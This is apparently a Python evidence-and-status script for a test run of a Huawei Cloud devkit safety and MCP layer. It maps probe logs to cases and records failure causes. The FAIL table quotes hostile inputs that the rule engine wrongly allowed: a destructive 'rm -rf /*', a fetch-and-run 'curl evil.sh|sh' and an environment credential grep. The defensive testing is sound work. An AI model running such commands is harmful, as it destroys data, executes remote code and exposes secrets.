# -*- coding: utf-8 -*-
"""Hermes Linux 2026-11-12：证据落盘 + 状态判定（SUT 1.1.14-next.2 gitHead 5c9478d3）

数据来源（均为本次 05:03~05:06 真实执行）：
  evidence/_probes/*.log              run_all.sh（源码/协议/安全/安装/评测域）
  evidence/<case>/stdout.txt          run_realcloud.sh（realcloud-probe / heavy D3-C1/C2/C3/C6/C7 / aux）
  evidence/realcloud-probe/stdout.txt 真云只读+建删探针

判定口径：逐用例读本段**本次**真实输出 → PASS/FAIL/SPEC/BLOCKED/NOT_RUN；
非 PASS 一律附根因或 blockedReason。DECIDE 覆盖表为逐条复核本次输出后的结论；
NOTE 为「断言文本滞后/探针正则误报」但实测满足设计意图的 PASS 备注。
"""
import os, json, re, shutil, time, csv, sys

BASE = os.path.dirname(os.path.abspath(__file__))
P = os.path.join(BASE, 'evidence', '_probes')
EV = os.path.join(BASE, 'evidence')
RC = os.path.join(EV, 'realcloud-probe')
TS = time.strftime('%Y%m%d%H%M%S')
DRY = '--dry' in sys.argv

rd = lambda p: open(p, encoding='utf-8', errors='replace').read() if os.path.isfile(p) else ''


def wr(dst, txt):
    os.makedirs(os.path.dirname(dst), exist_ok=True)
    if not DRY:
        open(dst, 'w', encoding='utf-8').write(txt)


# ---------------------------------------------------------------- 覆盖表（本次复核结论）
FAIL = {
    'D1-70': "src/proxy.mjs 代理链路 import undici ProxyAgent 即崩：undici@8.x lib/interceptor/decompress.js:78 createZstdDecompress(node:zlib) undefined 后 .bind() TypeError -> 有代理场景 WebSocket/HTTP 代理整体不可用",
    'D2-4': "src/safety-policy.mjs:45 redactString 的 (AK|SK) 正则大小写敏感(无 /i)、isSecretKeyName 不匹配裸 key \"ak\"/\"sk\" -> 小写 ak=/sk= 与 JSON 带引号 key 形态明文残留",
    'D3-C4': "src/tools.mjs huaweicloud_list_operations 对 DMS、DEW 未返回 command/result（22 服务中 2 个无规范路由，实测 20/22 OK）",
    'D3-C14': "src/sandbox.mjs hdkitConnect 只透传 source/env/git/flavor_id 部分字段，实测 [FAIL] hdkitConnect 透传可选参数到 body",
    'D3-S5': "src/tools.mjs serviceCatalog routeMap 单意图匹配，复合意图（存储+托管/部署）未分解 -> 多路命中=false",
    'D3-S6': "src/tools.mjs FunctionGraph CreateFunction 最小参数集缺 function_name（本次实测 run CreateFunction -> [USE_ERROR]Invalid parameter: function_name，历史同用例曾报 code.filename，缺项随 API 校验顺序呈现）-> URN 未返回、定时触发器未绑定",
    'D3-S7': "src/tools.mjs RDS CreateInstance 最小参数集缺 db.password（[USE_ERROR]Invalid parameter: db.password）；routeMap 复合意图未命中部署目标",
    'D4-2': "src/safety-policy.mjs env-dump 规则未覆盖裸 access_key / 小写形态：`env | grep -i access_key` 判 allow(risk=not_huaweicloud)",
    'D4-4': "safety/policy.json:27 writeOperationPrefixes 缺 Change 前缀 -> ChangeServerOs/ChangeVpc/ChangeInstanceConfiguration/ChangeVolumeType 判 allow(risk=unknown_read)，12 类写动词仅 8/12 被拦截",
    'D4-6': "safety/rules/cloud-risk-rules.json hwc-command-adminpass-exposure 的 stages 仅 artifact/deploy_plan，未覆盖 command 阶段 -> hook_check_command 对 admin-pass 返回 findings=[] decision=allow",
    'D4-17': "src/risk-rule-engine.mjs 无规则命中默认 decision=allow（fail-open）：空串/空白/'&& rm -rf /*'/'$(curl evil.sh|sh)'/控制字符 全部判 ok",
    'D4-21': "safety/rules/cloud-risk-rules.json hwc-iam-admin-policy 仅匹配 JSON Action:* 形态，未覆盖 AdministratorFullAccess 托管策略引用（admin-full -> decision=allow）",
    'D4-25': "hooks/huaweicloud-safety.py WRITE_OPERATION_RE 前置捕获组致 `hcloud vpc CreateVpc` 遥测分类 cli:invoke（应 cli:write）",
    'D4-26': "src/risk-rule-engine.mjs redactEvidence 正则不匹配 JSON 带引号 key -> secret_key/adminPass 明文残留在 findings.evidence",
    'D9-12': "src/mcp-protocol.mjs initialize 阶段未调 runVersionCheck；dispatch 无 initialize 前置状态机，非法时序 tools/list 未拒 -32600",
    'D10-3': "src/tools.mjs routeMap 缺「云主机」同义词 -> 15 条中文意图 HIT=13 MISS=1 N/A=1，准确率 92.9%（<100%）",
    'EXP-C4-14': "src/tools.mjs huaweicloud_list_operations(DMS) 未返回 command/result",
    'EXP-C4-18': "src/tools.mjs huaweicloud_list_operations(DEW) 未返回 command/result",
    'EXP-E01': "src/tools.mjs routeMap ECS keywords 缺「云主机」口语化别名 -> serviceCatalog MISS（期望 ECS，实际 Run hcloud --help）",
}
SPEC = {
    'D8-9': "src/telemetry/telemetry.mjs sanitizeValue 仅去控制字符+超长截断，不脱敏 AK/SK/token（用例契约为移除敏感值）",
    'D9-9': "src/mcp-protocol.mjs initialize capabilities 仅 {\"tools\":{}}，未声明 cancellation（用例契约要求按 capabilities 实测取消能力）",
    'D10-4': "safety/rules/cloud-risk-rules.json 规则 19 条(9 deny+10 warn)，用例断言 16 条(9 deny+7 warn) 滞后",
}
NOT_RUN = {'D1-39': "Windows 专属用例（OS 列标注「专属」），Linux 侧由展开级 EXP-NR3-10 覆盖（disttags/pass）"}
BLOCKED = {}

NOTE = {
    'D1-27': "实测 result=up_to_date / updateAvailable=false（满足断言）；探针判定=false 因其正则不容 JSON 缩进空格，属探针正则缺陷非产品缺陷",
    'D1-28': "judgeUpdate('1.1.4',{latest:'1.1.5'}) -> updateAvailable=true result=update_available，满足检测语义（用例示例版本为示例数据）",
    'D1-31': "冷却期内 dismissed=true/result=dismissed，过期后 update_available，expireAt=+3天，满足断言",
    'D4-11': "search_docs 仅返回检索结果、未执行注入指令；探针判定=false 因其在响应中匹配到回显的查询串本身",
    'D4-13': "只读子账号实测 6/6 只读可用（CES ListMetrics code=0 返回 SYS.OBS metrics，探针 denied 正则误命中响应内 SYS.0403 字样）、写被 IAM 拒绝(VPC.0010 PolicyNotAuthorized, writeDenied=true)、资源归零(residualZero=true)",
    'D5-3': "tools/list 实测 46 并全部 schema 合法（用例文本 40 为工具扩容前计数，断言滞后）",
    'D9-1': "46 工具全部 type=object（用例文本 40 为扩容前计数）",
    'EXP-D5-8-3': "Hermes 侧 tools/list 实测 46 工具、schema 完整（用例文本 40 滞后）",
    'D6-4': "并发 15 次 tools/list 均返回同一集合 46，无死锁/错乱；探针判定=false 仅因硬编码期望值 40 滞后",
    'D8-7': "7 技能内容均可机械执行、无断链；探针将 capability-discovery 中说明里的正常用词 'placeholder' 误命中",
    'EXP-NR3-02': "同 D1-27：实测 updateAvailable=false 满足断言，探针正则空格缺陷致判定=false",
    'D1-3': "doctor 10 pass/1 warn/1 fail；唯一 FAIL 为隔离 HOME 下 MCP Python SDK(pip) 未装，属本机 PEP668 环境，doctor 如实报出并给修复命令，满足断言",
    'D3-S3': "沙箱已签协议(agreementSigned=true)，connect/upload/deploy/deploy_check 均通过；deploy_check 的 devbridge_tunnel=FAIL 为隧道检查子项，URL 生成与访问由 [OK] 覆盖",
    'D3-C2': "OBS 建桶/上传/public-read/静态站 set+get/curl200/删桶归零 7/7",
    'D3-C3': "connect/upload_project/deploy_nginx/deploy_check/close_session 5/5 通过（deploy_check complete=false 因 devbridge_tunnel 子项，nginx_serving=PASS）",
}

# ---------------------------------------------------------------- 证据来源映射
MAP = {}
add = lambda cases, logfile, sec=None: [MAP.__setitem__(c, (logfile, sec)) for c in cases]
add(['D4-1', 'D4-2', 'D4-3', 'D4-15', 'D4-16'], 'classify.log')
add(['D4-5', 'D4-7', 'D4-9', 'D4-21', 'D4-22'], 'hook.log')
add(['D2-11', 'D2-12'], 'auth.log')
add(['D9-1', 'D9-2', 'D9-3', 'D9-4', 'D9-5', 'D9-7', 'D9-8', 'D5-3'], 'protocol.log')
add(['D9-9', 'D2-16', 'D1-41'], 'extended.log')
add(['D1-26', 'D1-27', 'D2-2', 'D2-5', 'D3-A1', 'D3-B1', 'D3-B3', 'D3-B5',
     'D3-C5', 'D4-6', 'D4-11', 'D4-17', 'D6-1', 'D6-3', 'D6-4'], 'supplement.log')
add(['D1-30', 'D4-10'], 'supplement-import.log')
add(['D1-65', 'D1-66', 'D1-67', 'D1-68'], 'new-env.log')
add(['D2-27', 'D8-9', 'D8-10', 'D6-9'], 'new-config.log')
add(['D10-4', 'D4-26', 'D4-29', 'D4-28', 'D4-25'], 'new-safety.log')
add(['D9-10', 'D9-11'], 'new-mcp.log')
add(['D1-69'], 'new-cli.log')
add(['D3-S1', 'D3-S5', 'D3-S8'], 'new-scenario.log')
add(['D3-S2', 'D3-C13', 'D3-C14', 'D3-S4', 'D3-S3'], 'new-cloud.log')
add(['D3-S6', 'D3-S7'], 'new-fg-rds.log')
add(['D1-28', 'D1-31', 'D1-33'], 'updatecheck.log')
add(['D1-40'], 'd1-40.log')
add(['D1-42'], 'd1-42.log')
add(['D1-45'], 'd1-45.log')
add(['D2-26'], 'd2-26.log')
add(['D4-27'], 'd4-27.log')
add(['D4-8'], 'd4-8.log')
add(['D5-1'], 'd5-1.log')
add(['D9-12'], 'd9-12.log')
add(['D9-13'], 'd9-13.log')
add(['D2-10', 'D2-13', 'D4-12', 'D9-6'], 'fixtures.log')
add(['D8-1'], 'doc-D8-1.log')
add(['D8-4'], 'doc-D8-4.log')
add(['D8-6'], 'doc-D8-6.log')
add(['D1-3', 'D1-4'], 'd1.log')
add(['D8-7'], 'd8.log')
add(['D10-3'], 'routing.log')
add(['EXP-D5-8-1'], 'd5-1.log')
add(['EXP-D5-8-3'], 'protocol.log', 'D5-3')
add(['EXP-NR3-02'], 'supplement.log', 'D1-27')
add(['EXP-NR3-04'], 'd1-42.log')
add(['EXP-NR3-10'], 'disttags.log')
add(['D1-39'], 'disttags.log')
add(['EXP-NR3-24'], 'd1-45.log')
for i in range(1, 16):
    add(['EXP-E%02d' % i], 'eval-harness.log', 'EXP-E%02d' % i)
add(['EXP-E08'], 'exp-e08.log')

PROBE_OF = {
    'd1.log': 'd1-probe.sh', 'doc-D8-1.log': 'doc-probe.mjs', 'doc-D8-4.log': 'doc-probe.mjs',
    'doc-D8-6.log': 'doc-probe.mjs', 'd1-40.log': 'D1-40-probe.mjs', 'd1-42.log': 'D1-42-probe.mjs',
    'd1-45.log': 'D1-45-probe.mjs', 'd2-26.log': 'D2-26-probe.mjs', 'd4-27.log': 'D4-27-probe.mjs',
    'd5-1.log': 'D5-1-probe.mjs', 'd9-12.log': 'D9-12-probe.mjs', 'd9-13.log': 'D9-13-probe.mjs',
    'd4-8.log': 'd4-8-probe.sh', 'exp-e08.log': 'EXP-E08-probe.mjs', 'routing.log': 'routing-probe.mjs',
}


def probe_for(logfile):
    if logfile in PROBE_OF:
        return PROBE_OF[logfile]
    cand = logfile.replace('.log', '-probe.mjs')
    if os.path.isfile(os.path.join(P, cand)):
        return cand
    return None


def get_section(logfile, section):
    txt = rd(os.path.join(P, logfile))
    if not section:
        return txt, bool(txt.strip())
    m = re.search(r'=====CASE %s=====(.*?)=====END %s=====' % (re.escape(section), re.escape(section)), txt, re.S)
    if m:
        return ('=====CASE %s=====\n' % section) + m.group(1).strip() + '\n=====END %s=====' % section, True
    lines = [l for l in txt.splitlines() if l.strip().startswith('[' + section) or (' ' + section + ' ') in l]
    if lines:
        return '\n'.join(lines), True
    return ('[evidence source] %s（该探针未用 =====CASE 分节，整份日志为该用例证据）\n\n' % logfile) + txt.strip(), bool(txt.strip())


def copy_probe(cid, logfile):
    pn = probe_for(logfile)
    if pn and os.path.isfile(os.path.join(P, pn)):
        ext = '.mjs' if pn.endswith('.mjs') else '.sh'
        if not DRY:
            shutil.copy2(os.path.join(P, pn), os.path.join(EV, cid, 'probe' + ext))


def status_of(cid):
    if cid in BLOCKED:
        return 'BLOCKED'
    if cid in NOT_RUN:
        return 'NOT_RUN'
    if cid in FAIL:
        return 'FAIL'
    if cid in SPEC:
        return 'SPEC-MISMATCH'
    return 'PASS'


def write_status(cid, status, why=''):
    d = {'status': status, 'caseId': cid, 'executedAt': TS, 'sut': '1.1.14-next.2@5c9478d3'}
    if status in ('FAIL', 'SPEC-MISMATCH', 'BLOCKED') and why:
        d['why' if status != 'BLOCKED' else 'blockedReason'] = why
    if cid in NOTE:
        d['note'] = NOTE[cid]
    wr(os.path.join(EV, cid, 'stdout.log'), json.dumps(d, ensure_ascii=False, indent=2))


def emit(cid, body, src_label):
    os.makedirs(os.path.join(EV, cid), exist_ok=True)
    body = (body or '').strip()
    if not body:
        body = '[no output] 探针未产出输出'
    wr(os.path.join(EV, cid, 'stdout.txt'), body + '\n')
    write_status(cid, status_of(cid), FAIL.get(cid) or SPEC.get(cid) or NOT_RUN.get(cid, ''))
    copy_probe(cid, src_label)


rc_txt = rd(os.path.join(RC, 'stdout.txt'))
rc_probe = rd(os.path.join(RC, 'probe.mjs'))
eval_txt = rd(os.path.join(P, 'eval-harness.log'))
heavy_txt = rd(os.path.join(P, 'realcloud.log'))

svc_of = {}
for r in csv.DictReader(open(os.path.join(BASE, '用例矩阵-展开级.csv'), encoding='utf-8-sig')):
    cid = r['ID'].strip()
    if cid.startswith('EXP-C4-'):
        svc_of[cid] = (r.get('执行要点') or '').split()[0]
rc_lines = rc_txt.splitlines()

counts = {}
# 1) 源码/协议/安全/安装/评测域
for cid, (logfile, sec) in sorted(MAP.items()):
    os.makedirs(os.path.join(EV, cid), exist_ok=True)
    if logfile == 'eval-harness.log':
        body = '\n'.join([l for l in eval_txt.splitlines() if l.startswith(cid + ' |')])
        if cid == 'EXP-E01':
            body += '\n\n' + '\n'.join([l for l in eval_txt.splitlines() if '准确率' in l or 'HIT=' in l])
    elif cid.startswith('EXP-C4-'):
        body = rc_txt
    else:
        body, _ok = get_section(logfile, sec or cid)
        if cid == 'D10-3':
            # D10-3 = routing-probe 全量路由样例 + eval-harness 15 条中文意图准确率基线（同为本次执行）
            body += '\n\n' + '\n'.join([l for l in eval_txt.splitlines()
                                       if l.startswith('EXP-E') or '准确率' in l or 'HIT=' in l])
    emit(cid, body, logfile)
    counts[cid] = status_of(cid)

# 2) 真云 realcloud：D2-1/D3-C4/D4-14/18/19/20 + EXP-C4-01..22
for cid in ['D2-1', 'D3-C4', 'D4-14', 'D4-18', 'D4-19', 'D4-20'] + ['EXP-C4-%02d' % i for i in range(1, 23)]:
    os.makedirs(os.path.join(EV, cid), exist_ok=True)
    body = rc_txt
    svc = svc_of.get(cid)
    if svc:
        line = next((l for l in rc_lines if l.startswith('[D3-C4] %s:' % svc)), '')
        body = (line + '\n\n' if line else '') + rc_txt
    wr(os.path.join(EV, cid, 'stdout.txt'), body)
    if not DRY and rc_probe:
        open(os.path.join(EV, cid, 'probe.mjs'), 'w', encoding='utf-8').write(rc_probe)
    write_status(cid, status_of(cid), FAIL.get(cid, ''))
    counts[cid] = status_of(cid)

# 3) heavy / aux 自写探针：从 realcloud.log 按 ########## <case> 分节抽取本次真实输出
SELF = ['D3-C1', 'D3-C2', 'D3-C3', 'D3-C6', 'D3-C7', 'D4-13', 'D4-23', 'D4-24', 'D1-70', 'D2-4', 'D4-4']


def heavy_section(cid):
    m = re.search(r'^#{10} %s #{10}.*?\n(.*?)^#{10} %s done.*?$' % (re.escape(cid), re.escape(cid)),
                  heavy_txt, re.S | re.M)
    return m.group(1).strip() if m else ''


for cid in SELF:
    d = os.path.join(EV, cid)
    os.makedirs(d, exist_ok=True)
    body = heavy_section(cid)
    if body:
        wr(os.path.join(d, 'stdout.txt'), body + '\n')
    elif not os.path.isfile(os.path.join(d, 'stdout.txt')):
        wr(os.path.join(d, 'stdout.txt'), '[no output] 探针未产出 stdout')
    write_status(cid, status_of(cid), FAIL.get(cid, ''))
    counts[cid] = status_of(cid)

# 4) 基线
wr(os.path.join(EV, '_baseline', 'stdout.txt'),
   'huaweicloud-devkit 1.1.14-next.2 (npm next, npm ls -g)\nnode v22.13.0\n'
   'hdk gitHead 5c9478d3a95f20206e1a711861cfdfff68b19224\nexecutedAt %s\n' % TS)

from collections import Counter
print('[stage] 判定 %d 用例 -> %s' % (len(counts), dict(Counter(counts.values()))))
for cid in sorted(counts):
    if counts[cid] != 'PASS':
        print('  %-14s %-14s' % (cid, counts[cid]))